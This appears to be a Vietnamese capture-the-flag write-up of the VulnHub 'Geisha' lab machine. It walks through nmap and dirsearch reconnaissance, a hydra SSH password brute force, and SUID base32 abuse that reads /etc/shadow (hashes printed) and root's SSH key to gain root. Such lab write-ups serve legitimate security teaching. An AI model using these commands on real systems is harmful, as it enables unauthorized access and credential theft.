Hello các bạn, lại là mình với series các bài vulnhub đây. Lần này vẫn tiếp tục là một machine của team [SunCSR Team](https://www.vulnhub.com/author/suncsr-team,696/). Cùng mình tìm hiểu nhé.

## I. Tổng quan
### 1. Geisha machine
Mình đánh giá đây là một machine không khó lắm của team [SunCSR Team](https://www.vulnhub.com/author/suncsr-team,696/) với độ khó là *Beginner to Intermediate*. Tuy nhiên, so với machine [loly]() mình viết lần trước thì sẽ có những yêu cầu khác hơn và các kĩ thuật mới hơn.

#### Description

```
Machine Name: Geisha_Sun*
Author: SunCSR Team
Difficulty: Beginner to Intermediate
Tested: VMware Workstation 15.x Pro & VirtualBox 6.x (This works better with VMware rather than VirtualBox)
DHCP: Enabled
Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).
Warning: Be careful with "rabbit hole".
Information: Your feedback is appreciated - Email: suncsr.challenges@gmail.com
```

Ở đây, tác giả có một warning về các *rabbit hole* nên có lẽ sẽ có kha khá cú lừa và ngõ cụt trong bài này rồi.

#### File Information

```
Filename: Geisha.zip
File size: 1.5 GB
MD5: 241F2141AD82F1DCE2CC42707B59C86F
SHA1: A920A58B8ABC2AF6E6BBF8CF69EBBFD52BA5C883
```

#### Screenshots

![](https://images.viblo.asia/ba461789-9f3e-4ce6-b972-f62893eafe2e.png)

![](https://images.viblo.asia/17bb44d8-1ff3-4e9a-88cc-62db3f91506c.png)


## II. Exploit

Đầu tiên như bao machine khác, công việc cần làm sẽ là reconnaise machine này và các dịch vụ chạy trên nó

### host scan

#### Command

```bash
nmap -sn 192.168.233.1/24
```

#### Output

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-18 08:17 +07
Nmap scan report for i121048-pc (192.168.233.1)
Host is up (0.00016s latency).
Nmap scan report for 192.168.233.130
Host is up (0.00098s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.05 seconds
```

Ở đây, mình tìm thấy địa chỉ của máy geisha là **192.168.233.130**. Tiếp theo là scan các dịch vụ chạy trên machine này

### nmap service scan

#### Command

```bash
nmap -v -sV -Pn -p- 192.168.233.130
```

##### Output

```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-18 08:22 +07
NSE: Loaded 42 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 08:22
Completed Parallel DNS resolution of 1 host. at 08:22, 0.03s elapsed
Initiating Connect Scan at 08:22
Scanning 192.168.233.130 [65535 ports]
Discovered open port 3389/tcp on 192.168.233.130
Discovered open port 80/tcp on 192.168.233.130
Discovered open port 21/tcp on 192.168.233.130
Discovered open port 22/tcp on 192.168.233.130
Discovered open port 9198/tcp on 192.168.233.130
Discovered open port 8088/tcp on 192.168.233.130
Discovered open port 7080/tcp on 192.168.233.130
Discovered open port 7125/tcp on 192.168.233.130
Completed Connect Scan at 08:22, 1.12s elapsed (65535 total ports)
Initiating Service scan at 08:22
Scanning 8 services on 192.168.233.130
Completed Service scan at 08:22, 22.12s elapsed (8 services on 1 host)
NSE: Script scanning 192.168.233.130.
Initiating NSE at 08:22
Completed NSE at 08:22, 0.12s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Nmap scan report for 192.168.233.130
Host is up (0.0045s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
3389/tcp open  http     nginx 1.14.2
7080/tcp open  ssl/http LiteSpeed httpd
7125/tcp open  http     nginx 1.17.10
8088/tcp open  http     LiteSpeed httpd
9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ở đây, như tác giả đã cảnh báo thì có kha khá dịch vụ trên machine này và chắc hơn nửa chỗ này là bẫy rồi. Dù sao cũng phải scan tiếp các dịch vụ này đã. Trước hết là dịch vụ các dịch vụ web.

### dirsearch

#### Command chung

```bash
./dirsearch -u http://192.168.233.130:{port}/ -e *
```

#### Output

##### 1. port 80

```bash
[08:32:14] Starting: 
[08:32:16] 403 -  280B  - /.htaccess-local
[08:32:16] 403 -  280B  - /.htaccess-dev
[08:32:16] 403 -  280B  - /.htaccess-marco                                                           
[08:32:16] 403 -  280B  - /.htaccess.bak1                                                            
[08:32:16] 403 -  280B  - /.htaccess.old                                                             
[08:32:16] 403 -  280B  - /.htaccess.orig                                                            
[08:32:16] 403 -  280B  - /.htaccess.sample                                                          
[08:32:16] 403 -  280B  - /.htaccess.txt                                                             
[08:32:16] 403 -  280B  - /.htaccess.save                                                            
[08:32:16] 403 -  280B  - /.htaccessBAK                                                              
[08:32:16] 403 -  280B  - /.htaccessOLD                                                              
[08:32:16] 403 -  280B  - /.htaccessOLD2                                                             
[08:32:16] 403 -  280B  - /.htpasswd-old                                                             
[08:32:16] 403 -  280B  - /.httr-oauth                                                               
[08:32:30] 200 -  176B  - /index.html
[08:32:30] 200 -    2B  - /info.php                                                                  
[08:32:37] 403 -  280B  - /server-status
[08:32:37] 403 -  280B  - /server-status/

Task Completed
```

Có vẻ không có gì thú vị ở đây r

##### 2. port 3389

```bash
[08:33:57] Starting: 
[08:34:02] 400 -  173B  - /%2e%2e/google.com
[08:34:08] 200 -  176B  - /index.html

Task Completed
```

Coi bộ ở đây cũng không vui lắm 
##### 3. port 7080

```bash
[08:43:05] Starting: 
[08:43:08] 301 -    0B  - /1389.txt  ->  https://192.168.233.130:7080/1389.txt
[08:43:11] 301 -    0B  - /admin1389.txt  ->  https://192.168.233.130:7080/admin1389.txt
[08:43:20] 301 -    0B  - /myadmin1389.txt  ->  https://192.168.233.130:7080/myadmin1389.txt

Task Completed
```
Có vẻ tiếp tục là cú lừa của tác giả :)))

##### 4. port 7125

```bash
[08:43:37] Starting: 
[08:43:40] 400 -  158B  - /%2e%2e/google.com
[08:43:45] 200 -  175B  - /index.php
[08:43:45] 200 -  175B  - /index.php/login/
[08:43:46] 200 -    1KB - /passwd

Task Completed
```
Có vẻ có thứ gì đó hay hay ở đây rồi. Có 2 đường dẫn `/index.php/login/` và `/passwd` khá đáng ngờ, thử vào xem.

**/index.php/login**

![](https://images.viblo.asia/f260cc24-8180-49c0-a2cf-3c0a62b53dfb.png)

Có vẻ chả có gì ở đây cả. 

**/passwd**
Ở đây, t thấy 1 file passwd được download về

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
```

Có vẻ hay ho, nhưng cứ xem nốt mấy cổng khác đã.

##### port 8088

```bash
[08:52:30] Starting: 
[08:52:35] 400 -    1KB - /%2e%2e/google.com
[08:52:41] 301 -    1KB - /cgi-bin  ->  http://192.168.233.130:8088/cgi-bin/
[08:52:42] 301 -    1KB - /docs  ->  http://192.168.233.130:8088/docs/
[08:52:42] 200 -    6KB - /docs/
[08:52:43] 200 -  176B  - /index.html
[08:52:44] 200 -    2B  - /info.php

Task Completed
```

Ở đây cũng không có gì hết

#### port 9198

```bash
[08:54:20] Starting: 
[08:54:26] 200 -  176B  - /index.html
[08:54:26] 200 -    2B  - /info.php

Task Completed
```

OK, ở đây cũng không có gì. 

Vậy là qua các cổng web, gợi ý duy nhất chúng ta có là một file passwd. Nếu cho ta ngai vàng, ta sẽ bán lấy tiền mua bánh ăn, nếu cho ta tên tài khoản thì ta đành tự đi bruteforce vậy. Ở đây, port 22 đang chạy service ssh nên chắc có thể thử bruteforce từ đây.

### Bruteforce ssh với hydra

#### Command

```
hydra -l geisha -P rockyou.txt 192.168.233.130 ssh
```

#### Output

```
[22][ssh] host: 192.168.233.130   login: geisha   password: letmein
```
here we gooooo

Giờ ssh vào máy nào

```bash
geisha@geisha:~$ id
uid=1000(geisha) gid=1000(geisha) groups=1000(geisha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

Kiểm tra quyền sudo của tài khoản này

```bash
geisha@geisha:~$ sudo -l
[sudo] password for geisha: 
Sorry, user geisha may not run sudo on geisha.
```

Tài khoản này k có quyền sudo, nên thử theo hướng khác vậy. Tìm các suid file trong máy

```bash
geisha@geisha:~$ find / -perm -u+s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/base32
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
```

**Note**: Tìm hiểu thêm về leo quyền với suid tại bài viết [này](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd)

Thử tìm kiếm các binary kia trên [gtfobins](https://gtfobins.github.io/gtfobins/base32/), mình thấy vài thông tin khá hay ho về base32:

![](https://images.viblo.asia/18ad7814-9afc-417b-bd19-0353e728e986.png)

Theo đó thì file này sẽ có thể đọc nội dung của 1 file với 2 thao tác là encode và decode:

```bash
base32 {file} | base32 --decode
```

Đầu tiên, thử đọc trong `/etc/shadow` để lấy password root

```bash
geisha@geisha:~$ base32 /etc/shadow | base32 --decode
root:$6$p/n6gA9F6qb7..aD$d4YNXyKsg.Tam5AoDiOp0T9rWAMAkN55O9.BTyhyOacdXHgpTkpbE9nBe5R35oFzntg7prt3xfdSW9U9Ty1680:18391:0:99999:7:::
daemon:*:18385:0:99999:7:::
bin:*:18385:0:99999:7:::
sys:*:18385:0:99999:7:::
sync:*:18385:0:99999:7:::
games:*:18385:0:99999:7:::
man:*:18385:0:99999:7:::
lp:*:18385:0:99999:7:::
mail:*:18385:0:99999:7:::
news:*:18385:0:99999:7:::
uucp:*:18385:0:99999:7:::
proxy:*:18385:0:99999:7:::
www-data:*:18385:0:99999:7:::
backup:*:18385:0:99999:7:::
list:*:18385:0:99999:7:::
irc:*:18385:0:99999:7:::
gnats:*:18385:0:99999:7:::
nobody:*:18385:0:99999:7:::
_apt:*:18385:0:99999:7:::
systemd-timesync:*:18385:0:99999:7:::
systemd-network:*:18385:0:99999:7:::
systemd-resolve:*:18385:0:99999:7:::
messagebus:*:18385:0:99999:7:::
sshd:*:18385:0:99999:7:::
geisha:$6$T3Eaf.KNaM9VPSMw$J5gIF6yNaKpyEXW77KtMUqtra1aE5sfQvWis48mofoo1L2bpl6vmU5riEDTGrPl0CvdwzuZJMqIp.LIHatkjn.:18391:0:99999:7:::
systemd-coredump:!!:18385::::::
ftp:*:18391:0:99999:7:::
```

Tuy nhiên, khi chạy `john` để thử decrypt thì quả thực rất khó để có được mật khẩu root. Vì thế, mình đi theo hướng khác là đọc ssh key của root và ssh vào máy.

![](https://images.viblo.asia/08bd85b3-cefd-4251-a971-e90fcf546a72.png)

ok, giờ lưu file này với quyền 600 và ssh vào thôi.

![](https://images.viblo.asia/68317f13-a3ac-4eb4-b20a-579e2e3e6fa1.png)

## III. Conclusion
Machine geisha là một machine cơ bản, phù hợp với độ khó trong description là *Beginner to Intermediate*. Với machine này, chúng ta học cách để enum nhiều nhất có thể, bruteforce và leo quyền với các suid file. Ngoài ra, tác giả đã cài rất nhiều các *rabbit hole* để người chơi kiên nhẫn hơn, tạo thêm chút khó khăn trong khi giải quyết machine.